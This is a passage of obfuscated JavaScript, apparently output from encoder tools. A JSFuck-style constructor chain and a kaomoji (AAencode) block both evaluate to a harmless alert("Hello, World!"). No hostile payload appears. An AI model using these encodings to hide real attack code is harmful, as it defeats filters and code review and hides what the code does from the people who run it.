String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(33)")()+([false]+"")[13]+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(33)")()+([false]+"")[13]+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(33)")()+([false]+"")[13]+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[12]+([false]+"")[11]+([false]+"")[12]+([false]+"")[12]+([false]+"")[11]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()
ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_');
[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(969)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65417)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65344)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65357)")()+[]["constructor"]["constructor"]("return String.fromCharCode(180)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65289)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65417)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(126)")()+[]["constructor"]["constructor"]("return String.fromCharCode(9531)")()+[]["constructor"]["constructor"]("return String.fromCharCode(9473)")()+[]["constructor"]["constructor"]("return String.fromCharCode(9531)")()+(false+[0]+"")[7]+(false+[0]+"")[7]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(42)")()+[]["constructor"]["constructor"]("return String.fromCharCode(180)")()+[]["constructor"]["constructor"]("return String.fromCharCode(8711)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65344)")()+[]["constructor"]["constructor"]("return String.fromCharCode(42)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+[0]+"")[7]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65392)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+(false+[0]+"")[7]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+(+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return 